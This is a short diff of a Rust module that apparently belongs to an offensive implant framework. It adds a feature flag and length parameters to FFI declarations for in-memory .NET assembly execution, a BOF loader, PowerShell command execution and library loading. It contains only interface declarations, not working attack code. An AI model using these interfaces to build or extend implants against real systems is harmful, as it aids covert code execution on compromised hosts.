@@ -1,4 +1,5 @@
 #![feature(stmt_expr_attributes)]
+#![feature(type_alias_impl_trait)]
 pub mod net;
 pub mod fs;
 pub mod sys;
@@ -214,10 +215,11 @@ pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
 #[cfg(feature = "community")]
 #[link(name="malefic_win_kit", kind="dylib")]
 extern "C" {
-    fn MaleficExecAssembleInMemory(data: *const u8, data_len: usize, args: *const *const u8) -> *const u8;
+    fn MaleficExecAssembleInMemory(data: *const u8, data_len: usize, args: *const *const u8, args_len: usize) -> *const u8;
     fn MaleficBofLoader(buffer: *const u8, 
         buffer_len: usize, 
         arguments: *const *const u8,
+        arguments_len: usize,
         entrypoint_name: *const u8) -> *const u8;
     fn MaleficPwshExecCommand(command: *const u8, command_len: usize) -> *const u8;
     fn MaleficLoadLibrary(
